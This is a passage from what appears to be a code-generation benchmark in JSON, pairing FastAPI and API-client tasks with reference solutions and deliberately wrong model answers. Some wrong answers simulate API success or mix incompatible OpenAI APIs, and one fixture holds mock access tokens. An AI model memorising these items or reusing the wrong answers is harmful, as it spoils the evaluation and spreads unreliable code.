loggerobject.error(txt)\n            rtn = {'text': txt}\n            rtn['error'] = str(ex)\n            rtn['status_code'] = statuscode\n            rtn['response_object'] = responseobject\n            return False, rtn\n\n        try:\n            if endpoint not in self.versions.keys():\n                raise SxTAPINotDefinedError(\"Endpoint not defined in API Lookup (apiversions.json). Please reach out to Space and Time for assistance. \\nAs a work-around, you can try manually adding the endpoint to the SXTBaseAPI.versions dictionary.\")\n            version = self.versions[endpoint]\n            self.logger.debug(f'API Call started for endpoint: {version}/{endpoint}')\n\n            if request_type not in SXTApiCallTypes:\n                msg = f'request_type must be of type SXTApiCallTypes, not { type(request_type) }'\n                raise SxTArgumentError(msg, logger=self.logger)\n\n            for name, value in path_parms.items():\n                endpoint = endpoint.replace(f'{{{name}}}', value)\n\n            if query_parms != {}:\n                endpoint = f'{endpoint}?' + '&'.join([f'{n}={v}' for n, v in query_parms.items()])\n\n            headers = {k: v for k, v in self.standard_headers.items()}\n            if auth_header: headers['authorization'] = f'Bearer {self.access_token}'\n            headers.update(header_parms)\n\n            url = f'{self.api_url}/{version}/{endpoint}'\n\n            match request_type:\n                case SXTApiCallTypes.POST: callfunc = requests.post\n                case SXTApiCallTypes.GET: callfunc = requests.get\n                case SXTApiCallTypes.PUT: callfunc = requests.put\n                case SXTApiCallTypes.DELETE: callfunc = requests.delete\n                case _: raise SxTArgumentError('Call type must be SXTApiCallTypes enum.', logger=self.logger)\n\n            response = callfunc(url=url, data=json.dumps(data_parms), headers=headers)\n            txt = response.text\n            statuscode = response.status_code\n            response.raise_for_status()\n\n            try:\n                self.logger.debug('API return content type: ' + response.headers.get('content-type', ''))\n                rtn = response.json()\n            except json.decoder.JSONDecodeError as ex:\n                rtn = {'text': txt, 'status_code': statuscode}\n\n            self.logger.debug(f'API call completed for endpoint: \"{endpoint}\" with result: {txt}')\n            return True, rtn\n\n        except requests.exceptions.RequestException as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n        except SxTAPINotDefinedError as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n        except Exception as ex:\n            return __handle_errors__(txt, ex, statuscode, response, self.logger)\n\n    def __fakedata__(self, endpoint: str):\n        if endpoint in ['sql', 'sql/dql']:\n            rtn = [{'id': '1', 'str': 'a', 'this_record': 'is a test'}]\n            rtn.append({'id': '2', 'str': 'b', 'this_record': 'is a test'})\n            rtn.append({'id': '3', 'str': 'c', 'this_record': 'is a test'})\n            return rtn\n        else:\n            return {'authCode': '469867d9660b67f8aa12b2',\n                    'accessToken': 'eyJ0eXBlIjoiYWNjZXNzIiwia2lkIjUxNDVkYmQtZGNmYi00ZjI4LTg3NzItZjVmNjNlMzcwM2JlIiwiYWxnIjoiRVMyNTYifQ.eyJpYXQiOjE2OTczOTM1MDIsIm5iZiI6MTY5NzM5MzUwMiwiZXhwIjoxNjk3Mzk1MDAyLCJ0eXBlIjoiYWNjZXNzIiwidXNlciI6InN0ZXBoZW4iLCJzdWJzY3JpcHRpb24iOiIzMWNiMGI0Yi0xMjZlLTRlM2MtYTdhMS1lNWRmNDc4YTBjMDUiLCJzZXNzaW9uIjoiMzNiNGRhMzYxZjZiNTM3MjZlYmYyNzU4Iiwic3NuX2V4cCI6MTY5NzQ3OTkwMjMxNSwiaXRlcmF0aW9uIjoiNDEwY2YyZTgyYWZlODdmNDRiMzE4NDFiIn0.kpvrG-ro13P1YeMF6sjLh8wn1rO3jpCVeTrzhDe16ZmJu4ik1amcYz9uQff_XQcwBDrpnCeD5ZZ9mHqb_basew',\n                    'refreshToken': 'eyJ0eXBlIjoicmVmcmVzaCIsImtpZCITQ1ZGJkLWRjZmItNGYyOC04NzcyLWY1ZjYzZTM3MDNiZSIsImFsZyI6IkVTMjU2In0.eyJpYXQiOjE2OTczOTM1MDIsIm5iZiI6MTY5NzM5MzUwMiwiZXhwIjoxNjk3Mzk1MzAyLCJ0eXBlIjoicmVmcmVzaCIsInVzZXIiOiJzdGVwaGVuIiwic3Vic2NyaXB0aW9uIjoiMzFjYjBiNGItMTI2ZS00ZTNjLWE3YTEtZTVkZjQ3OGEwYzA1Iiwic2Vzc2lvbiI6IjMzYjRkYTM2MWY2YjUzNzI2ZWJmMjc1OCIsInNzbl9leHAiOjE2OTc0Nzk5MDIzMTUsIml0ZXJhdGlvbiI6IjQxMGNmMmU4MmFmZTg3ZjQ0YjMxODQxYiJ9.3vVYpTGBjXIejlaacaZOh_59O9ETfbvTCWvldoi0ojyXTRkTmENVpQRbw7av7yMM2jA7SRdEPQGGjYmThCfk9w',\n                    'accessTokenExpires': 1973950023160,\n                    'refreshTokenExpires': 1973953023160}",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport logging\nfrom typing import Union, Dict, Tuple\nfrom enum import Enum\n\nclass SXTApiCallTypes(Enum):\n    GET = 'GET'\n    POST = 'POST'\n    PUT = 'PUT'\n    DELETE = 'DELETE'\n\nclass SXTBaseAPI:\n    def __init__(self, access_token: str = '', logger: logging.Logger = None) -> None:\n        self.api_url = 'https://api.spaceandtime.app'\n        self.access_token = access_token\n        self.logger = logger or logging.getLogger(__name__)\n        self.network_calls_enabled = True\n        self.standard_headers = {'Content-Type': 'application/json'}\n        self.versions = {}\n        self.APICALLTYPE = SXTApiCallTypes\n\n    def call_api(self, endpoint: str, auth_header: bool = True, request_type: str = SXTApiCallTypes.POST, header_parms: Dict = {}, data_parms: Dict = {}, query_parms: Dict = {}, path_parms: Dict = {}) -> Tuple[bool, Dict]:\n        if not self.network_calls_enabled:\n            return True, self.__fakedata__(endpoint)\n\n        headers = self.standard_headers.copy()\n        if auth_header:\n            headers['Authorization'] = f'Bearer {self.access_token}'\n\n        headers.update(header_parms)\n\n        try:\n            # Simulate API call\n            response_data = {\n                'status_code': 200,\n                'data': 'Sample response data'\n            }\n            success = response_data['status_code'] == 200\n            self.logger.info(f\"API call successful to {endpoint}\")\n            return success, response_data['data']\n        except Exception as e:\n            self.logger.error(f\"Error during API call to {endpoint}: {str(e)}\")\n            return False, {}\n\n    def __fakedata__(self, endpoint: str) -> Union[list, dict]:\n        # Mock data generation\n        if endpoint == '/users':\n            return [{'id': 1, 'name': 'John Doe'}, {'id': 2, 'name': 'Jane Doe'}]\n        elif endpoint == '/user/1':\n            return {'id': 1, 'name': 'John Doe', 'email': 'john@example.com'}\n        else:\n            return {}\n```"
  },
  {
    "Task_id": 122,
    "Instruction": "Task Description: Implement a FastAPI-based HTTP server for handling conversational AI queries and chat interactions, with support for both direct queries and streaming chat responses.\n\nClass Description: RayAssistantDeployment is a class that encapsulates the functionality for handling HTTP requests in a conversational AI service. It provides endpoints for direct queries (/query) and chat interactions (/chat), with support for streaming responses in chat mode.\n\nAttributes:\n\napp: FastAPI - The FastAPI application instance that handles HTTP requests and routes.\n\nMethods:\n\n__init__: [Name](app: FastAPI) -> None - Initializes the class with a FastAPI app instance and registers the query and chat endpoints.\n\npredict: [Name](query: Query, stream: bool) -> Dict[str, Any] - Internal prediction method that processes the input query and returns a dictionary containing the AI response (implementation would be provided separately).\n\nquery: [Name](query: Query) -> Answer - Handles POST requests to the /query endpoint, processes the query using predict, and returns an Answer object containing the response.\n\nproduce_chat_answer: [Name](request: Request, result: Dict[str, Any]) -> Generator[str, None, None] - Generator function that yields chat response pieces and sources for streaming.\n\nchat: [Name](request: Request) -> StreamingResponse - Handles POST requests to the /chat endpoint, processes the conversation using predict (with streaming enabled for single messages), and returns a streaming response.",
    "Canonical_solution": "from fastapi import FastAPI\nfrom pydantic import BaseModel, Field\nfrom starlette.responses import StreamingResponse\nfrom typing import List, Dict, Any\n\nclass Message(BaseModel):\n    role: str = Field(\n        ..., description=\"The role of the author of the message, typically 'user', or 'assistant'.\"\n    )\n    content: str = Field(..., description=\"The content of the message.\")\n\nclass Request(BaseModel):\n    messages: List[Message] = Field(\n        ..., description=\"A list of messages that make up the conversation.\"\n    )\n\nclass Query(BaseModel):\n    query: str\n\nclass Answer(BaseModel):\n    question: str\n    answer: str\n    sources: List[str]\n    llm: str\n\nclass RayAssistantDeployment:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self.app.post(\"/query\")(self.query)\n        self.app.post(\"/chat\")(self.chat)\n\n    def predict(self, query: Query, stream: bool) -> Dict[str, Any]:\n        # Implementation would go here\n        pass\n\n    def query(self, query: Query) -> Answer:\n        result = self.predict(query, stream=False)\n        return Answer.parse_obj(result)\n\n    def produce_chat_answer(self, request: Request, result: Dict[str, Any]):\n        answer = []\n        for answer_piece in result[\"answer\"]:\n            answer.append(answer_piece)\n            yield answer_piece\n\n        if result[\"sources\"]:\n            yield \"\\n\\n**Sources:**\\n\"\n            for source in result[\"sources\"]:\n                yield \"* \" + source + \"\\n\"\n\n    def chat(self, request: Request) -> StreamingResponse:\n        if len(request.messages) == 1:\n            query = Query(query=request.messages[0].content)\n            result = self.predict(query, stream=True)\n        else:\n            # Simplified implementation for follow-up questions\n            result = {\"answer\": [\"Response\"], \"llm\": \"gpt-4\", \"sources\": [], \"document_ids\": []}\n\n        return StreamingResponse(\n            self.produce_chat_answer(request, result), media_type=\"text/plain\"\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, Request, WebSocket\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom pydantic import BaseModel\nfrom typing import Dict, Any, Generator\n\nclass Query(BaseModel):\n    text: str\n\nclass Answer(BaseModel):\n    response: str\n\nclass RayAssistantDeployment:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self.app.add_api_route(\"/query\", self.query, methods=[\"POST\"])\n        self.app.add_api_route(\"/chat\", self.chat, methods=[\"POST\"])\n\n    async def predict(self, query: Query, stream: bool) -> Dict[str, Any]:\n        # Placeholder for prediction logic\n        return {\"response\": \"This is a response\"}\n\n    async def query(self, query: Query) -> Answer:\n        result = await self.predict(query, stream=False)\n        return Answer(response=result[\"response\"])\n\n    async def produce_chat_answer(self, request: Request, result: Dict[str, Any]) -> Generator[str, None, None]:\n        yield result[\"response\"]\n\n    async def chat(self, request: Request) -> StreamingResponse:\n        data = await request.json()\n        query = Query(**data)\n        result = await self.predict(query, stream=True)\n        return StreamingResponse(self.produce_chat_answer(request, result))\n\n# Example usage\napp = FastAPI()\ndeployment = RayAssistantDeployment(app)\n\n# Run the server with uvicorn: uvicorn script_name:app --reload\n```\n\nNote: This code is a template and requires implementation of the `predict` method with actual conversational AI logic. Additionally, the `chat` endpoint is set up to handle streaming, but the `predict` method should be modified to support streaming if needed."
  },
  {
    "Task_id": 123,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server for handling image segmentation and processing requests using SAM (Segment Anything Model) and related models.\n\nClass Description: SamAPI is a class that encapsulates all the route handlers for a FastAPI application dealing with image segmentation tasks. It provides endpoints for model prediction, mask dilation, and various segmentation techniques.\n\nAttributes:\n- app: FastAPI - The FastAPI application instance that will handle HTTP requests\n\nMethods:\n- __init__(app: FastAPI) -> None - Initializes the SamAPI class with a FastAPI instance and sets up routes\n- _setup_routes() -> None - Private method that defines all API endpoints and their handlers\n\nRoute Handlers (methods defined within _setup_routes):\n- heartbeat() -> Dict - Simple health check endpoint\n- api_sam_model() -> List[str] - Returns available SAM models\n- api_sam_predict(payload: SamPredictRequest) -> Any - Handles SAM model prediction requests\n- api_dino_predict(payload: DINOPredictRequest) -> Any - Handles DINO model prediction requests\n- api_dilate_mask(payload: DilateMaskRequest) -> Any - Handles mask dilation requests\n- api_controlnet_seg(payload: ControlNetSegRequest, autosam_conf: AutoSAMConfig) -> Any - Handles ControlNet segmentation requests\n- api_category_mask(payload: CategoryMaskRequest, autosam_conf: AutoSAMConfig) -> Any - Handles category-specific mask generation requests\n\nSupporting Models (Pydantic BaseModel classes):\n- SamPredictRequest - Request model for SAM predictions\n- DINOPredictRequest - Request model for DINO predictions\n- DilateMaskRequest - Request model for mask dilation\n- AutoSAMConfig - Configuration model for AutoSAM parameters\n- ControlNetSegRequest - Request model for ControlNet segmentation\n- CategoryMaskRequest - Request model for category-specific masking",
    "Canonical_solution": "from fastapi import FastAPI, Body\nfrom pydantic import BaseModel\nfrom typing import Any, Optional, List\nfrom PIL import Image\nimport numpy as np\nimport os\n\nclass SamAPI:\n    def __init__(self, app: FastAPI):\n        self.app = app\n        self._setup_routes()\n\n    class SamPredictRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        sam_positive_points: List[List[float]] = []\n        sam_negative_points: List[List[float]] = []\n        dino_enabled: bool = False\n        dino_model_name: Optional[str] = \"GroundingDINO_SwinT_OGC (694MB)\"\n        dino_text_prompt: Optional[str] = None\n        dino_box_threshold: Optional[float] = 0.3\n        dino_preview_checkbox: bool = False\n        dino_preview_boxes_selection: Optional[List[int]] = None\n\n    class DINOPredictRequest(BaseModel):\n        input_image: str\n        dino_model_name: str = \"GroundingDINO_SwinT_OGC (694MB)\"\n        text_prompt: str\n        box_threshold: float = 0.3\n\n    class DilateMaskRequest(BaseModel):\n        input_image: str\n        mask: str\n        dilate_amount: int = 10\n\n    class AutoSAMConfig(BaseModel):\n        points_per_side: Optional[int] = 32\n        points_per_batch: int = 64\n        pred_iou_thresh: float = 0.88\n        stability_score_thresh: float = 0.95\n        stability_score_offset: float = 1.0\n        box_nms_thresh: float = 0.7\n        crop_n_layers: int = 0\n        crop_nms_thresh: float = 0.7\n        crop_overlap_ratio: float = 512 / 1500\n        crop_n_points_downscale_factor: int = 1\n        min_mask_region_area: int = 0\n\n    class ControlNetSegRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        input_image: str\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n\n    class CategoryMaskRequest(BaseModel):\n        sam_model_name: str = \"sam_vit_h_4b8939.pth\"\n        processor: str = \"seg_ofade20k\"\n        processor_res: int = 512\n        pixel_perfect: bool = False\n        resize_mode: Optional[int] = 1\n        target_W: Optional[int] = None\n        target_H: Optional[int] = None\n        category: str\n        input_image: str\n\n    def _setup_routes(self):\n        @self.app.get(\"/sam/heartbeat\")\n        async def heartbeat():\n            return {\"msg\": \"Success!\"}\n\n        @self.app.get(\"/sam/sam-model\")\n        async def api_sam_model() -> List[str]:\n            return sam_model_list\n\n        @self.app.post(\"/sam/sam-predict\")\n        async def api_sam_predict(payload: SamPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert('RGBA')\n            sam_output_mask_gallery, sam_message = sam_predict(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.sam_positive_points,\n                payload.sam_negative_points,\n                payload.dino_enabled,\n                payload.dino_model_name,\n                payload.dino_text_prompt,\n                payload.dino_box_threshold,\n                payload.dino_preview_checkbox,\n                payload.dino_preview_boxes_selection)\n            result = {\"msg\": sam_message}\n            if len(sam_output_mask_gallery) == 9:\n                result[\"blended_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[:3]))\n                result[\"masks\"] = list(map(encode_to_base64, sam_output_mask_gallery[3:6]))\n                result[\"masked_images\"] = list(map(encode_to_base64, sam_output_mask_gallery[6:]))\n            return result\n\n        @self.app.post(\"/sam/dino-predict\")\n        async def api_dino_predict(payload: DINOPredictRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            dino_output_img, _, dino_msg = dino_predict(\n                payload.input_image,\n                payload.dino_model_name,\n                payload.text_prompt,\n                payload.box_threshold)\n            return {\n                \"msg\": dino_msg[\"value\"] if \"value\" in dino_msg else \"Done\",\n                \"image_with_box\": encode_to_base64(dino_output_img) if dino_output_img is not None else None,\n            }\n\n        @self.app.post(\"/sam/dilate-mask\")\n        async def api_dilate_mask(payload: DilateMaskRequest = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image).convert(\"RGBA\")\n            payload.mask = decode_to_pil(payload.mask)\n            dilate_result = list(map(encode_to_base64, update_mask(payload.mask, 0, payload.dilate_amount, payload.input_image)))\n            return {\"blended_image\": dilate_result[0], \"mask\": dilate_result[1], \"masked_image\": dilate_result[2]}\n\n        @self.app.post(\"/sam/controlnet-seg\")\n        async def api_controlnet_seg(payload: ControlNetSegRequest = Body(...),\n                                    autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            cnet_seg_img, cnet_seg_msg = cnet_seg(\n                payload.sam_model_name,\n                payload.input_image,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            cnet_seg_img = list(map(encode_to_base64, cnet_seg_img))\n            result = {\"msg\": cnet_seg_msg}\n            if len(cnet_seg_img) == 3:\n                result[\"blended_images\"] = cnet_seg_img[0]\n                result[\"random_seg\"] = cnet_seg_img[1]\n                result[\"edit_anything_control\"] = cnet_seg_img[2]\n            elif len(cnet_seg_img) == 4:\n                result[\"sem_presam\"] = cnet_seg_img[0]\n                result[\"sem_postsam\"] = cnet_seg_img[1]\n                result[\"blended_presam\"] = cnet_seg_img[2]\n                result[\"blended_postsam\"] = cnet_seg_img[3]\n            return result\n\n        @self.app.post(\"/sam/category-mask\")\n        async def api_category_mask(payload: CategoryMaskRequest = Body(...),\n                                  autosam_conf: AutoSAMConfig = Body(...)) -> Any:\n            payload.input_image = decode_to_pil(payload.input_image)\n            category_mask_img, category_mask_msg, resized_input_img = categorical_mask(\n                payload.sam_model_name,\n                payload.processor,\n                payload.processor_res,\n                payload.pixel_perfect,\n                payload.resize_mode,\n                payload.target_W,\n                payload.target_H,\n                payload.category,\n                payload.input_image,\n                autosam_conf.points_per_side,\n                autosam_conf.points_per_batch,\n                autosam_conf.pred_iou_thresh,\n                autosam_conf.stability_score_thresh,\n                autosam_conf.stability_score_offset,\n                autosam_conf.box_nms_thresh,\n                autosam_conf.crop_n_layers,\n                autosam_conf.crop_nms_thresh,\n                autosam_conf.crop_overlap_ratio,\n                autosam_conf.crop_n_points_downscale_factor,\n                autosam_conf.min_mask_region_area)\n            category_mask_img = list(map(encode_to_base64, category_mask_img))\n            result = {\"msg\": category_mask_msg}\n            if len(category_mask_img) == 3:\n                result[\"blended_image\"] = category_mask_img[0]\n                result[\"mask\"] = category_mask_img[1]\n                result[\"masked_image\"] = category_mask_img[2]\n            if resized_input_img is not None:\n                result[\"resized_input\"] = encode_to_base64(resized_input_img)\n            return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel\nfrom typing import List, Dict, Any\n\nclass SamPredictRequest(BaseModel):\n    image_url: str\n    points: List[List[int]]\n\nclass DINOPredictRequest(BaseModel):\n    image_url: str\n\nclass DilateMaskRequest(BaseModel):\n    mask: List[List[int]]\n    kernel_size: int\n\nclass AutoSAMConfig(BaseModel):\n    threshold: float\n\nclass ControlNetSegRequest(BaseModel):\n    image_url: str\n    control_image_url: str\n\nclass CategoryMaskRequest(BaseModel):\n    image_url: str\n    category: str\n\nclass SamAPI:\n    def __init__(self, app: FastAPI) -> None:\n        self.app = app\n        self._setup_routes()\n\n    def _setup_routes(self) -> None:\n        @self.app.get(\"/heartbeat\")\n        def heartbeat() -> Dict:\n            return {\"status\": \"ok\"}\n\n        @self.app.get(\"/api/sam/model\")\n        def api_sam_model() -> List[str]:\n            return [\"model1\", \"model2\"]\n\n        @self.app.post(\"/api/sam/predict\")\n        def api_sam_predict(payload: SamPredictRequest) -> Any:\n            # Implement SAM prediction logic here\n            pass\n\n        @self.app.post(\"/api/dino/predict\")\n        def api_dino_predict(payload: DINOPredictRequest) -> Any:\n            # Implement DINO prediction logic here\n            pass\n\n        @self.app.post(\"/api/mask/dilate\")\n        def api_dilate_mask(payload: DilateMaskRequest) -> Any:\n            # Implement mask dilation logic here\n            pass\n\n        @self.app.post(\"/api/controlnet/seg\")\n        def api_controlnet_seg(payload: ControlNetSegRequest, autosam_conf: AutoSAMConfig) -> Any:\n            # Implement ControlNet segmentation logic here\n            pass\n\n        @self.app.post(\"/api/category/mask\")\n        def api_category_mask(payload: CategoryMaskRequest, autosam_conf: AutoSAMConfig) -> Any:\n            # Implement category-specific mask generation logic here\n            pass\n\n# Example usage\napp = FastAPI()\nsam_api = SamAPI(app)\n```"
  },
  {
    "Task_id": 124,
    "Instruction": "Task Description: Create a FastAPI-based service for extracting and citing facts from a given context in response to a user query, using OpenAI's language model for processing and providing streaming responses.\n\nClass Description: ExtractionService is a FastAPI application that handles question-answering with citation extraction. It processes user queries against provided context, extracts facts with proper citations, and streams the results back to the client.\n\nAttributes:\napp: FastAPI - The FastAPI application instance that handles HTTP requests and routes\nclient: OpenAI - The OpenAI client configured for structured output using the instructor library\n\nMethods:\n__init__: () -> None - Initializes the FastAPI application and sets up routes\n_setup_routes: () -> None - Configures the API endpoints and their handlers\nextract: (question: Question, openai_key: str) -> StreamingResponse - The endpoint handler that processes extraction requests and returns streaming responses\nstream_extract: (question: Question) -> Iterable[Fact] - Performs the actual extraction using OpenAI's API and yields facts\nget_api_key: (request: Request) -> str - Retrieves the OpenAI API key from either environment variables or request headers",
    "Canonical_solution": "from fastapi import FastAPI, Request, HTTPException, Depends\nfrom fastapi.params import Depends\nfrom pydantic import BaseModel, Field\nfrom starlette.responses import StreamingResponse\nfrom collections.abc import Iterable\nimport json\nimport os\nimport logging\nfrom instructor import OpenAISchema\nfrom instructor.dsl.multitask import MultiTaskBase\nfrom openai import OpenAI\nimport instructor\n\nclient = instructor.from_openai(OpenAI())\nlogger = logging.getLogger(__name__)\n\nclass Fact(BaseModel):\n    fact: str = Field(\n        ...,\n        description=\"Body of the sentences, as part of a response, it should read like a sentence that answers the question\",\n    )\n    substring_quotes: list[str] = Field(\n        ...,\n        description=\"Each source should be a direct quote from the context, as a substring of the original content\",\n    )\n\n    def _get_span(self, quote, context):\n        import regex\n        minor = quote\n        major = context\n        errs_ = 0\n        s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        while s is None and errs_ <= len(context) * 0.05:\n            errs_ += 1\n            s = regex.search(f\"({minor}){{e<={errs_}}}\", major)\n        if s is not None:\n            yield from s.spans()\n\n    def get_spans(self, context):\n        if self.substring_quotes:\n            for quote in self.substring_quotes:\n                yield from self._get_span(quote, context)\n\nclass QuestionAnswer(OpenAISchema, MultiTaskBase):\n    question: str = Field(..., description=\"Question that was asked\")\n    tasks: list[Fact] = Field(\n        ...,\n        description=\"Body of the answer, each fact should be its separate object with a body and a list of sources\",\n    )\n\nQuestionAnswer.task_type = Fact\n\nclass Question(BaseModel):\n    context: str = Field(..., description=\"Context to extract answers from\")\n    query: str = Field(..., description=\"Question to answer\")\n\nclass ExtractionService:\n    def __init__(self):\n        self.app = FastAPI(title=\"Citation with Extraction\")\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.post(\"/extract\", response_class=StreamingResponse)\n        async def extract(question: Question, openai_key: str = Depends(self.get_api_key)):\n            facts = self.stream_extract(question)\n            async def generate():\n                for fact in facts:\n                    logger.info(f\"Fact: {fact}\")\n                    spans = list(fact.get_spans(question.context))\n                    resp = {\n                        \"body\": fact.fact,\n                        \"spans\": spans,\n                        \"citation\": [question.context[a:b] for (a, b) in spans],\n                    }\n                    resp_json = json.dumps(resp)\n                    yield f\"data: {resp_json}\"\n                yield \"data: [DONE]\"\n            return StreamingResponse(generate(), media_type=\"text/event-stream\")\n\n    def stream_extract(self, question: Question) -> Iterable[Fact]:\n        completion = client.chat.completions.create(\n            model=\"gpt-3.5-turbo-0613\",\n            temperature=0,\n            stream=True,\n            functions=[QuestionAnswer.openai_schema],\n            function_call={\"name\": QuestionAnswer.openai_schema[\"name\"]},\n            messages=[\n                {\n                    \"role\": \"system\",\n                    \"content\": \"You are a world class algorithm to answer questions with correct and exact citations.\",\n                },\n                {\"role\": \"user\", \"content\": \"Answer question using the following context\"},\n                {\"role\": \"user\", \"content\": f\"{question.context}\"},\n                {\"role\": \"user\", \"content\": f\"Question: {question.query}\"},\n                {\n                    \"role\": \"user\",\n                    \"content\": \"Tips: Make sure to cite your sources, and use the exact words from the context.\",\n                },\n            ],\n            max_tokens=2000,\n        )\n        return QuestionAnswer.from_streaming_response(completion)\n\n    def get_api_key(self, request: Request):\n        if \"OPENAI_API_KEY\" in os.environ:\n            return os.environ[\"OPENAI_API_KEY\"]\n        auth = request.headers.get(\"Authorization\")\n        if auth is None:\n            raise HTTPException(status_code=401, detail=\"Missing Authorization header\")\n        if auth.startswith(\"Bearer \"):\n            return auth.replace(\"Bearer \", \"\")\n        return None",
    "Code_level": "Class-level",
    "FSMID_for_test": 61,
    "wrong_result": "```python\nfrom fastapi import FastAPI, Request, HTTPException\nfrom fastapi.responses import StreamingResponse\nfrom pydantic import BaseModel\nimport openai\nfrom typing import Iterable, Optional\nimport os\n\nclass Question(BaseModel):\n    query: str\n    context: str\n\nclass Fact(BaseModel):\n    fact: str\n    citation: str\n\nclass ExtractionService:\n    def __init__(self):\n        self.app = FastAPI()\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.app.post(\"/extract\")\n        async def extract_endpoint(question: Question, request: Request):\n            api_key = self.get_api_key(request)\n            return StreamingResponse(self.stream_extract(question, api_key))\n\n    def stream_extract(self, question: Question, api_key: str) -> Iterable[Fact]:\n        openai.api_key = api_key\n        response = openai.Completion.create(\n            engine=\"davinci-codex\",\n            prompt=f\"Context: {question.context}\\nQuestion: {question.query}\\nExtract facts with citations:\",\n            max_tokens=150,\n            stream=True\n        )\n        \n        current_fact = \"\"\n        current_citation = \"\"\n        in_fact = False\n        in_citation = False\n        \n        for chunk in response:\n            text = chunk.choices[0].delta.get(\"content\", \"\")\n            \n            if \"Fact:\" in text:\n                in_fact = True\n                continue\n            elif \"Citation:\" in text:\n                in_citation = True\n                continue\n            \n            if in_fact:\n                current_fact += text\n            elif in_citation:\n                current_citation += text\n            \n            if text.endswith(\"\\n\"):\n                if in_fact:\n                    yield Fact(fact=current_fact.strip(), citation=\"\")\n                    current_fact = \"\"\n                    in_fact = False\n                elif in_citation:\n                    yield Fact(fact=\"\", citation=current_citation.strip())\n                    current_citation = \"\"\n                    in_citation = False\n\n    def get_api_key(self, request: Request) -> str:\n        api_key = request.headers.get(\"X-API-KEY\")\n        if not api_key:\n            api_key = os.getenv(\"OPENAI_API_KEY\")\n        if not api_key:\n            raise HTTPException(status_code=400, detail=\"OpenAI API key is missing\")\n        return api_key\n\n# Example usage\nif __name__ == \"__main__\":\n    import uvicorn\n    service = ExtractionService()\n    uvicorn.run(service.app, host=\"0.0.0.0\", port=8000)\n```"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a FastAPI-based HTTP server implementation that handles dynamic route creation, exception translation, and streaming responses, with built-in tracing middleware for request monitoring.\n\nClass Description: LlamaStackServer is a configurable HTTP server implementation using FastAPI that provides dynamic route creation, exception handling, and support for streaming responses (SSE). It includes middleware for request tracing and manages the lifecycle of implementation components.\n\nAttributes:\n\nconfig: [dict] - Configuration dictionary for server setup\napp: [FastAPI] - Main FastAPI application instance\nimpls: [Optional[dict]] - Dictionary of implementation components managed by the server\n\nMethods:\n\n__init__: [Name](config: dict) -> [None] - Initializes the server with given configuration and sets up FastAPI app with tracing middleware\nlifespan: [Name](app: FastAPI) -> [AsyncContextManager] - Async context manager for server lifecycle (startup/shutdown)\nglobal_exception_handler: [Name](request: Request, exc: Exception) -> [JSONResponse] - Handles all uncaught exceptions and translates them to HTTP responses\ntranslate_exception: [Name](exc: Exception) -> [Union[HTTPException, RequestValidationError]] - Converts Python exceptions to appropriate HTTP exceptions\ncreate_dynamic_typed_route: [Name](func: Any, method: str) -> [Callable] - Creates a FastAPI route handler with proper typing and parameter handling\nis_streaming_request: [Name](func_name: str, request: Request, **kwargs) -> [bool] - Determines if a request should be handled as a streaming response\nmaybe_await: [Name](value: Any) -> [Coroutine] - Helper method to await coroutines or return values directly\nsse_generator: [Name](event_gen: AsyncGenerator) -> [AsyncGenerator] - Converts an async generator to Server-Sent Events (SSE) format\ncreate_sse_event: [Name](data: Any) -> [str] - Formats data as an SSE event string",
    "Canonical_solution": "from fastapi import Body, FastAPI, HTTPException, Request\nfrom fastapi.responses import JSONResponse, StreamingResponse\nfrom pydantic import BaseModel\nfrom typing import Any, Union\nimport asyncio\nimport inspect\nimport json\nfrom typing_extensions import Annotated\n\nclass TracingMiddleware:\n    def __init__(self, app):\n        self.app = app\n\n    async def __call__(self, scope, receive, send):\n        path = scope[\"path\"]\n        await start_trace(path, {\"__location__\": \"server\"})\n        try:\n            return await self.app(scope, receive, send)\n        finally:\n            await end_trace()\n\nclass LlamaStackServer:\n    def __init__(self, config):\n        self.config = config\n        self.app = FastAPI(lifespan=self.lifespan)\n        self.app.add_middleware(TracingMiddleware)\n        self.impls = None\n\n    @asynccontextmanager\n    async def lifespan(self, app: FastAPI):\n        print(\"Starting up\")\n        yield\n        print(\"Shutting down\")\n        for impl in app.__llama_stack_impls__.values():\n            await impl.shutdown()\n\n    async def global_exception_handler(self, request: Request, exc: Exception):\n        traceback.print_exception(exc)\n        http_exc = self.translate_exception(exc)\n        return JSONResponse(\n            status_code=http_exc.status_code, 